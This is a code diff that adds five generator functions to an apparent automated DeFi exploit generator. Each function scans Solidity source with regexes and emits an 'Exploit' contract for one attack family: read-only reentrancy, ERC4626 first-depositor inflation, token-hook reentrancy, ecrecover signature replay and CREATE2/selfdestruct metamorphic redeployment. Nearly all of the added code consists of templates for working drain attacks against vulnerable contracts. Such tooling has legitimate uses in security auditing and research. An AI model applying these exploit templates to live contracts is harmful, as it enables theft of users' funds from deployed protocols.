@@ -37,6 +37,11 @@ def iter_defi_families(src: str, name: str) -> Iterator[Tuple[str, str]]:
     yield from _cross_chain_bridge(s, fns, name)
     yield from _liquidate_other(s, fns, name)
     yield from _imported_protocol(s, fns, name)
+    yield from _readonly_reentrancy(s, fns, name)
+    yield from _vault_inflation(s, fns, name)
+    yield from _hook_reentrancy(s, fns, name)
+    yield from _sig_replay(s, fns, name)
+    yield from _metamorphic(s, fns, name)
 
 
 def _unpermissioned_callback(s, fns, name):
@@ -679,5 +684,208 @@ def _imported_protocol(s, fns, name):
         + "            if (b > 0) { IERC20(tok).approve(p, b); IERC20(tok).transfer(p, b); }\n"
         + "        }\n"
         + f"        try IT(t).{drain['name']}{{value: msg.value}}(1 ether) {{}} catch {{}}\n"
+        + "    }\n    receive() external payable {}\n}\n",
+    )
+
+
+def _readonly_reentrancy(s, fns, name):
+    """View reads this.balance (or token.balanceOf(this)) while a call is
+    in-flight. receive() deposits/borrows against the stale view."""
+    if not re.search(r"address\s*\(\s*this\s*\)\s*\.balance|balanceOf\s*\(\s*address\s*\(\s*this", s):
+        return
+    if not re.search(r"\.call\s*\{", s):
+        return
+    view = next(
+        (f for f in fns if "view" in (f.get("head") or "") and re.search(
+            r"price|totalAssets|get_virtual|convertTo", f["name"] or "", re.I)),
+        None,
+    )
+    pull = next(
+        (f for f in fns if f["external"] and re.search(
+            r"withdraw|borrow|removeLiquidity", f["name"], re.I)),
+        None,
+    )
+    push = next(
+        (f for f in fns if f["external"] and re.search(
+            r"deposit|addLiquidity|mint", f["name"], re.I)),
+        None,
+    )
+    if not pull:
+        return
+    yield (
+        "readonly-reentrancy",
+        HEADER
+        + "// Family: read-only reentrancy. View still sees pre-effect reserves.\n"
+        + "interface IT {\n"
+        + (f"    function {pull['name']}() external payable;\n" if not pull["args"] else
+           f"    function {pull['name']}(uint256) external payable;\n")
+        + (f"    function {push['name']}() external payable;\n" if push and not push["args"] else
+           (f"    function {push['name']}(uint256) external payable;\n" if push else ""))
+        + "}\n"
+        + "contract Exploit {\n"
+        + "    address t;\n    uint256 hits;\n"
+        + "    function run(address x) external payable {\n"
+        + "        t = x;\n"
+        + ("        IT(x)." + pull["name"] + "{value: 0}("
+           + ("1" if pull["args"] else "") + ");\n")
+        + "    }\n"
+        + "    receive() external payable {\n"
+        + "        if (hits++ > 2) return;\n"
+        + (("        try IT(t)." + push["name"] + "{value: msg.value}("
+            + ("1" if push and push["args"] else "") + ") {} catch {}\n") if push else "")
+        + ("        try IT(t)." + pull["name"] + "("
+           + ("1" if pull["args"] else "") + ") {} catch {}\n")
+        + "    }\n}\n",
+    )
+
+
+def _vault_inflation(s, fns, name):
+    """First depositor donates, converts 1 wei into 1 share, then donates a
+    large amount so later depositors round to 0 shares."""
+    if not re.search(r"convertToShares|previewDeposit|totalAssets", s):
+        return
+    deposit = next(
+        (f for f in fns if f["external"] and re.search(r"deposit|mint", f["name"], re.I)),
+        None,
+    )
+    redeem = next(
+        (f for f in fns if f["external"] and re.search(
+            r"redeem|withdraw", f["name"], re.I)),
+        None,
+    )
+    if not deposit:
+        return
+    dargs = "1" if deposit["args"] else ""
+    rargs = "1" if (redeem and redeem["args"]) else ""
+    yield (
+        "vault-inflation",
+        HEADER
+        + "// Family: ERC4626 first-depositor inflation.\n"
+        + "interface IERC20 { function transfer(address,uint256) external returns (bool);\n"
+        + "    function balanceOf(address) external view returns (uint256); }\n"
+        + "interface IT {\n"
+        + f"    function {deposit['name']}(" + ("uint256" if deposit["args"] else "") + ") external payable;\n"
+        + (f"    function {redeem['name']}(" + ("uint256" if redeem and redeem["args"] else "") + ") external payable;\n"
+            if redeem else "")
+        + "    function token() external view returns (address);\n"
+        + "    function convertToShares(uint256) external view returns (uint256);\n"
+        + "}\n"
+        + "contract Exploit {\n"
+        + "    function run(address t) external payable {\n"
+        + f"        try IT(t).{deposit['name']}{{value: 1}}({dargs}) {{}} catch {{}}\n"
+        + "        address tok; try IT(t).token() returns (address k) { tok = k; } catch {}\n"
+        + "        if (tok != address(0)) {\n"
+        + "            uint256 b = IERC20(tok).balanceOf(address(this));\n"
+        + "            if (b > 1) { IERC20(tok).transfer(t, b - 1); }\n"
+        + "        } else if (address(this).balance > 1) {\n"
+        + "            payable(t).call{value: address(this).balance - 1}(\"\");\n"
+        + "        }\n"
+        + ((f"        try IT(t).{redeem['name']}{{value: 0}}({rargs}) {{}} catch {{}}\n") if redeem else "")
+        + "    }\n    receive() external payable {}\n}\n",
+    )
+
+
+def _hook_reentrancy(s, fns, name):
+    if not re.search(r"tokensReceived|onERC721Received|onERC1155Received", s):
+        return
+    pull = next(
+        (f for f in fns if f["external"] and re.search(
+            r"withdraw|drain|exit|redeem", f["name"], re.I)),
+        None,
+    )
+    if not pull:
+        return
+    pargs = "1" if pull["args"] else ""
+    yield (
+        "hook-reentrancy",
+        HEADER
+        + "// Family: ERC777/721 hook reentrancy. Token callback before CEI.\n"
+        + "interface IT { "
+        + f"function {pull['name']}(" + ("uint256" if pull["args"] else "") + ") external payable; }\n"
+        + "contract Exploit {\n"
+        + "    address t; uint256 hits;\n"
+        + "    function run(address x) external payable { t = x; "
+        + f"IT(x).{pull['name']}({pargs}); }}\n"
+        + "    function tokensReceived(address,address,address,uint256,bytes calldata,bytes calldata) external {\n"
+        + "        if (hits++ > 2) return; try IT(t)." + pull["name"] + f"({pargs}) {{}} catch {{}}\n"
+        + "    }\n"
+        + "    function onERC721Received(address,address,uint256,bytes calldata) external returns (bytes4) {\n"
+        + "        if (hits++ > 2) return this.onERC721Received.selector;\n"
+        + "        try IT(t)." + pull["name"] + f"({pargs}) {{}} catch {{}}\n"
+        + "        return this.onERC721Received.selector;\n"
+        + "    }\n    receive() external payable {}\n}\n",
+    )
+
+
+def _sig_replay(s, fns, name):
+    if not re.search(r"ecrecover", s):
+        return
+    if re.search(r"nonce|deadline|usedHashes", s):
+        return
+    claim = next(
+        (f for f in fns if f["external"] and re.search(
+            r"claim|withdraw|execute|permit|mint", f["name"], re.I)
+         and re.search(r"ecrecover|v\b|signature", f["body"] + f["head"])),
+        None,
+    )
+    if not claim:
+        claim = next((f for f in fns if f["external"] and re.search(
+            r"claim|withdraw|execute", f["name"], re.I)), None)
+    if not claim:
+        return
+    yield (
+        f"sig-replay:{claim['name']}",
+        HEADER
+        + "// Family: ecrecover without nonce. Replay a stored / guessed sig twice.\n"
+        + "interface IT {\n"
+        + f"    function {claim['name']}(bytes32,uint8,bytes32,bytes32) external payable;\n"
+        + "    function r() external view returns (bytes32);\n"
+        + "    function s() external view returns (bytes32);\n"
+        + "    function v() external view returns (uint8);\n"
+        + "    function digest() external view returns (bytes32);\n"
+        + "}\n"
+        + "contract Exploit {\n"
+        + "    function run(address t) external payable {\n"
+        + "        bytes32 rr; bytes32 ss; uint8 vv; bytes32 d;\n"
+        + "        try IT(t).r() returns (bytes32 x) { rr = x; } catch {}\n"
+        + "        try IT(t).s() returns (bytes32 x) { ss = x; } catch {}\n"
+        + "        try IT(t).v() returns (uint8 x) { vv = x; } catch {}\n"
+        + "        try IT(t).digest() returns (bytes32 x) { d = x; } catch {}\n"
+        + f"        try IT(t).{claim['name']}(d, vv, rr, ss) {{}} catch {{}}\n"
+        + f"        try IT(t).{claim['name']}(d, vv, rr, ss) {{}} catch {{}}\n"
+        + "    }\n    receive() external payable {}\n}\n",
+    )
+
+
+def _metamorphic(s, fns, name):
+    if not (re.search(r"CREATE2|create2", s) and re.search(r"selfdestruct|suicide", s)):
+        return
+    deploy = next(
+        (f for f in fns if f["external"] and re.search(
+            r"deploy|create", f["name"], re.I)),
+        None,
+    )
+    destroy = next(
+        (f for f in fns if f["external"] and re.search(
+            r"destroy|kill|die|selfdestruct", f["name"], re.I)
+         or "selfdestruct" in (f.get("body") or "")),
+        None,
+    )
+    yield (
+        "metamorphic",
+        HEADER
+        + "// Family: CREATE2 + selfdestruct. Same salt, new runtime.\n"
+        + "interface IT {\n"
+        + (f"    function {destroy['name']}() external payable;\n" if destroy and not destroy["args"] else
+           (f"    function {destroy['name']}(address) external payable;\n" if destroy else ""))
+        + (f"    function {deploy['name']}(bytes32,bytes memory) external payable;\n" if deploy else "")
+        + "}\n"
+        + "contract Exploit {\n"
+        + "    function run(address t) external payable {\n"
+        + (("        try IT(t)." + destroy["name"] + "("
+            + ("address(this)" if destroy and destroy["args"] else "") + ") {} catch {}\n")
+           if destroy else "")
+        + (("        try IT(t)." + deploy["name"]
+            + "(keccak256(\"salt\"), hex\"60016000f3\") {} catch {}\n") if deploy else "")
         + "    }\n    receive() external payable {}\n}\n",
     )
